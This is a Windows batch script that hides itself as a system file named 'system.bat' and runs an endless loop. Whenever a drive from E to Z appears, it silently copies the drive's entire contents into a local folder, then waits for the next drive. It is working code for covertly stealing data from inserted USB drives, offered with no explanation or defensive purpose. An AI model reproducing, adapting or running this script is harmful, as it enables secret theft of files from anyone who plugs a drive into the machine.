@echo off

set DIR="C:\Users\Inka\Documents\test"

attrib +s +h "system.bat"
chcp 65001
title system
set OK=0
cls
:run
if %OK%== 0 goto HEOK
if %OK%== 1 goto OK
goto run
:DISKFOUND
echo FOUND %DISK%
set OK=1
xcopy %DISK%:\ %DIR% /S /E /Y
goto run
:HEOK
:: if exist A: set DISK=A&& goto DISKFOUND
:: if exist B: set DISK=B&& goto DISKFOUND
:: if exist C: set DISK=C&& goto DISKFOUND
:: if exist D: set DISK=D&& goto DISKFOUND
if exist E: set DISK=E&& goto DISKFOUND
if exist F: set DISK=F&& goto DISKFOUND
if exist G: set DISK=G&& goto DISKFOUND
if exist H: set DISK=H&& goto DISKFOUND
if exist I: set DISK=I&& goto DISKFOUND
if exist J: set DISK=J&& goto DISKFOUND
if exist K: set DISK=K&& goto DISKFOUND
if exist L: set DISK=L&& goto DISKFOUND
if exist M: set DISK=M&& goto DISKFOUND
if exist N: set DISK=N&& goto DISKFOUND
if exist O: set DISK=O&& goto DISKFOUND
if exist P: set DISK=P&& goto DISKFOUND
if exist Q: set DISK=Q&& goto DISKFOUND
if exist R: set DISK=R&& goto DISKFOUND
if exist S: set DISK=S&& goto DISKFOUND
if exist T: set DISK=T&& goto DISKFOUND
if exist U: set DISK=U&& goto DISKFOUND
if exist V: set DISK=V&& goto DISKFOUND
if exist W: set DISK=W&& goto DISKFOUND
if exist X: set DISK=X&& goto DISKFOUND
if exist Y: set DISK=Y&& goto DISKFOUND
if exist Z: set DISK=Z&& goto DISKFOUND
goto run
:OK
if not exist %DISK%: set OK=0 && set DISK=NO
goto run